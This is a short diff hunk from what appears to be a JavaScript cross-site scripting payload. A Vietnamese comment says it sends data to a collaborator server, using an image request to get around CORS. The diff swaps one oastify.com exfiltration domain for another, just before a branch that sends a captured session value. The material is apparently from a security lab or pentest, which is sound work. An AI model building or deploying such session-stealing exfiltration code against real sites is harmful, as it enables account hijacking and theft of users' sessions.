@@ -34,7 +34,7 @@
         }
         
         // 3. Gửi data về collaborator (dùng img để bypass CORS)
-        const domain = 'lpev189ho4ebjqr4wu0l0bammds4g34s.oastify.com';
+        const domain = 'f6mqvtz6gyt12egnnl9a5ewuvl1cp2dr.oastify.com';
         
         if (sessionValue) {
             // Gửi session
